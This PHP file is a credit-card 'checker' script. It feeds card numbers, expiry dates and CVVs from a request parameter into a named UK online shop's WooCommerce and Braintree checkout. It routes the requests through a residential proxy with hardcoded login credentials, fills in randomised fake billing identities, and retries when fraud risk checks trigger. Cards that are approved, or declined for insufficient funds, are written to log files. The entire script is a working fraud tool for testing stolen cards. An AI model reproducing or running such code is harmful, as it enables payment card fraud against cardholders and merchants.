<?php

////////////[2 Curl Template]////////////

error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");
if(!is_dir(getcwd()."/posty")) mkdir(getcwd()."/posty", 0755);
$posty = getcwd()."/posty/malone".rand(1000000, 99999999).".txt";

///////////////[Functions]///////////////

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function RandomString($length = 5) {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
}

function emailGenerate($length = 10) {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
}

function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}

function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}

$formkey = GetRandomWord();
$formkey = substr(str_shuffle(mt_rand().mt_rand().$formkey), 0, 16);


extract($_GET);
$lista = str_replace(" ", "", $lista);
$i     = explode("|", $lista);
$cc    = preg_replace("/[^0-9]/", "", $i[0]);
$mm    = preg_replace("/[^0-9]/", "", $i[1]);
$yyyy  = preg_replace("/[^0-9]/", "", $i[2]);
$yy    = substr($yyyy, 2, 4);
$cvv   = preg_replace("/[^0-9]/", "", $i[3]);
$bin   = substr($cc, 0, 6);
$last4 = substr($cc, 12, 16);
$m     = ltrim($mm, "0");
$email = emailGenerate();
$emailencode = urlencode($email);
$name     = RandomString();
$lastname = RandomString();
$last4 = substr($cc, -4);
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);

if(substr($cc, 0, 1) == 3) {
  $type = "American Express";
} 
 elseif(substr($cc, 0, 1) == 4) {
  $type = "Visa";
} 
 elseif(substr($cc, 0, 1) == 5) {
  $type = "MasterCard";
} 
 else{
  $type = "Discover";
}



$rand = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f');
$color = $rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)].$rand[rand(0,15)];
///////////////[Variables]///////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fantinipelletteria.co.uk/product/diagrams-for-faceting-books/');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.fantinipelletteria.co.uk',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Referer: https://www.fantinipelletteria.co.uk/women-key-holder/',
'Connection: keep-alive',
'Upgrade-Insecure-Requests: 1',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
'Cache-Control: max-age=0',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fantinipelletteria.co.uk/women-key-holder/');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.fantinipelletteria.co.uk',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary93rMSoTj2yxG6aEL',
'Origin: https://www.fantinipelletteria.co.uk',
'Connection: keep-alive',
'Referer: https://www.fantinipelletteria.co.uk/women-key-holder/',
'Upgrade-Insecure-Requests: 1',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundary93rMSoTj2yxG6aEL
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundary93rMSoTj2yxG6aEL
Content-Disposition: form-data; name="add-to-cart"

18123
------WebKitFormBoundary93rMSoTj2yxG6aEL--');
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fantinipelletteria.co.uk/checkout/');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.fantinipelletteria.co.uk',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'Connection: keep-alive',
'Referer: https://www.fantinipelletteria.co.uk/cart/',
'Upgrade-Insecure-Requests: 1',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";
$nonce = GetStr($exe,'checkout-nonce" value="','"');
//echo "<b>cartid:</b><br>$cartid<br>";
$getbearer = base64_decode(GetStr($exe,'wc_braintree_client_token = ["','"]'));
$bearer = GetStr($getbearer,'"authorizationFingerprint":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: payments.braintree-api.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: */*',
'Content-Type: application/json',
'Authorization: Bearer '.$bearer.'',
'Braintree-Version: 2018-05-10',
'Origin: https://assets.braintreegateway.com/',
'Connection: keep-alive',
'Referer: hhttps://assets.braintreegateway.com/',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"927c235b-b680-46d0-8a81-dffd'.rand(1111111,9999999).'58"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.' ","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"","billingAddress":{"postalCode":"L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'","streetAddress":"'.rand(1111111,9999999).' Racco Pkwy"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";
$token = GetStr($exe,'"token":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fantinipelletteria.co.uk/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.fantinipelletteria.co.uk',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: */*',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'Origin: https://www.fantinipelletteria.co.uk',
'Connection: keep-alive',
'Referer: https://www.fantinipelletteria.co.uk/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_country=CA&billing_first_name='.$name.'&billing_last_name='.$lastname.'&billing_postcode=L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'&billing_address_1='.rand(111,999).'+Racco+Pkwy&billing_address_2=&billing_city=Thornhill&billing_state=ON&billing_phone='.rand(111111111,999999999).'&billing_email='.$emailencode.'&ws_opt_in=1&account_password=&shipping_country=CA&shipping_first_name='.$name.'&shipping_last_name='.$lastname.'&shipping_address_1='.rand(111,999).'+Racco+Pkwy&shipping_address_2=&shipping_city=Thornhill&shipping_postcode=L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'&shipping_state=ON&order_comments=&shipping_method%5B0%5D=flat_rate%3A3&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%227b8'.rand(111111111,999999999).'71c096d1a678b42f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22b887ddb63819adb02d6572d7aaa75'.rand(111,999).'%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fyps8jyspyrmns2bb%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fyps8jyspyrmns2bb%22%7D%2C%22merchantId%22%3A%22yps8jyspyrmns2bb%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5M2MwYmI3OC00MGQyLTQyMDktYWFkNC1jMDI4NzA4OGZlNjQiLCJpYXQiOjE2ODIzNTI5OTAsImV4cCI6MTY4MjM2MDE5MCwiaXNzIjoiNWViNjliOTE0NGVjZDcwZjY3NGVlNjVlIiwiT3JnVW5pdElkIjoiNWViMWZlZmM0NGVjZDcwZjY3NGVlNWM1In0.25XL_c0Ua2WN06mq7zFFq4hwq1r0lzyc7d6x1FGFb1c%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Fantini+Pelletteria%22%2C%22clientId%22%3A%22AZA9vxIFz_l8Dzx6PrhLc-BiHIta52v5jq1jf8LI9oVAYrkmuxWR5Lrb-AKw35Qndof7K2JXSu7ipZau%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fwww.fantinipelletteria.co.uk%2Fprivacy-policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fwww.fantinipelletteria.co.uk%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22fantinipelletteriaukGBP%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
/////////////////////////////////////////


$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";
$session = 0;

while (strpos($exe,'risk_threshold') && $session <= 10) {

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: payments.braintree-api.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: */*',
'Content-Type: application/json',
'Authorization: Bearer '.$bearer.'',
'Braintree-Version: 2018-05-10',
'Origin: https://assets.braintreegateway.com/',
'Connection: keep-alive',
'Referer: hhttps://assets.braintreegateway.com/',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"927c235b-b680-46d0-8a81-dffd'.rand(1111111,9999999).'58"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.' ","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"","billingAddress":{"postalCode":"L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'","streetAddress":"'.rand(1111111,9999999).' Racco Pkwy"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";
$token = GetStr($exe,'"token":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.fantinipelletteria.co.uk/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_PROXY, 'residential.smspool.net:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'SFPR7PEtxT:IvIGU5DIpb');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.fantinipelletteria.co.uk',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/201'.rand(11111,99999).' Firefox/88.0',
'Accept: */*',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'X-Requested-With: XMLHttpRequest',
'Origin: https://www.fantinipelletteria.co.uk',
'Connection: keep-alive',
'Referer: https://www.fantinipelletteria.co.uk/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $posty, CURLOPT_COOKIEJAR => $posty]);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_country=CA&billing_first_name='.$name.'&billing_last_name='.$lastname.'&billing_postcode=L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'&billing_address_1='.rand(111,999).'+Racco+Pkwy&billing_address_2=&billing_city=Thornhill&billing_state=ON&billing_phone='.rand(111111111,999999999).'&billing_email='.$emailencode.'&ws_opt_in=1&account_password=&shipping_country=CA&shipping_first_name='.$name.'&shipping_last_name='.$lastname.'&shipping_address_1='.rand(111,999).'+Racco+Pkwy&shipping_address_2=&shipping_city=Thornhill&shipping_postcode=L'.rand(1,9).'K'.rand(1,9).'X'.rand(1,9).'&shipping_state=ON&order_comments=&shipping_method%5B0%5D=flat_rate%3A3&payment_method=braintree_cc&braintree_cc_nonce_key='.$token.'&braintree_cc_device_data=%7B%22device_session_id%22%3A%227b8'.rand(111111111,999999999).'71c096d1a678b42f%22%2C%22fraud_merchant_id%22%3Anull%2C%22correlation_id%22%3A%22b887ddb63819adb02d6572d7aaa75'.rand(111,999).'%22%7D&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fyps8jyspyrmns2bb%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fyps8jyspyrmns2bb%22%7D%2C%22merchantId%22%3A%22yps8jyspyrmns2bb%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22kount%22%3A%7B%22kountMerchantId%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Maestro%22%2C%22UK+Maestro%22%2C%22MasterCard%22%2C%22Visa%22%5D%7D%2C%22threeDSecureEnabled%22%3Atrue%2C%22threeDSecure%22%3A%7B%22cardinalAuthenticationJWT%22%3A%22eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI5M2MwYmI3OC00MGQyLTQyMDktYWFkNC1jMDI4NzA4OGZlNjQiLCJpYXQiOjE2ODIzNTI5OTAsImV4cCI6MTY4MjM2MDE5MCwiaXNzIjoiNWViNjliOTE0NGVjZDcwZjY3NGVlNjVlIiwiT3JnVW5pdElkIjoiNWViMWZlZmM0NGVjZDcwZjY3NGVlNWM1In0.25XL_c0Ua2WN06mq7zFFq4hwq1r0lzyc7d6x1FGFb1c%22%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Fantini+Pelletteria%22%2C%22clientId%22%3A%22AZA9vxIFz_l8Dzx6PrhLc-BiHIta52v5jq1jf8LI9oVAYrkmuxWR5Lrb-AKw35Qndof7K2JXSu7ipZau%22%2C%22privacyUrl%22%3A%22https%3A%2F%2Fwww.fantinipelletteria.co.uk%2Fprivacy-policy%2F%22%2C%22userAgreementUrl%22%3A%22https%3A%2F%2Fwww.fantinipelletteria.co.uk%2Fterms-and-conditions%2F%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22fantinipelletteriaukGBP%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22GBP%22%7D%7D&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');
/////////////////////////////////////////

$exe = curl_exec($ch);
$showexe = htmlentities($exe);
//echo "<b>exe:</b><br>$exe<br>";
$session++;
}

$response = trim(strip_tags(GetStr($exe,'messages":"<ul class=\"woocommerce-error message-wrapper\" role=\"alert\">\n\t\t\t<li>\n\t\t\t<div class=\"message-container container alert-color medium-text-center\">\n\t\t\t\t<span class=\"message-icon icon-close\"><\/span>\n\t\t\t\tThere was an error processing your payment. ','\t\t\t<\/div>\n\t\t<\/li>\n\t<\/ul>\n\n<input type=\"hidden\" id=\"wc_braintree_checkout_error\" value=\"true\" \/>"')));
$success = trim(strip_tags(GetStr($exe,'"result":"','"')));

curl_close($ch);
unlink($posty);
////////////////////////////===[Card Response]Thank you. Your online payment has been received.
if($success == 'success') {
  fwrite(fopen('livekoto.txt', 'a'), $lista."\r\n");
    echo "<font size=2 color='white'><font class='badge badge-success'>Aprovada</font> $lista <font size=2 color='white'><font class='badge badge-success'>TANGINA MO </i> </font><br>"; 
}
elseif(substr_count($response,'Insufficient Funds') == 1) {
  fwrite(fopen('inskoto.txt', 'a'), $lista."\r\n");
    echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada</font> $lista <font size=2 color='white'><font class='badge badge-success'>Insufficient Funds </i> </font><br>"; 
}
 else{
  echo "<font size=2 color='white'><font class='badge badge-danger'>Reprovada</font> $lista <font class='badge badge-danger'>$response [$session]</i> </font><br>";

}
////////////////////////////////////////

ob_flush();
//////////////[Echo Result]///////////
//echo $result;
?>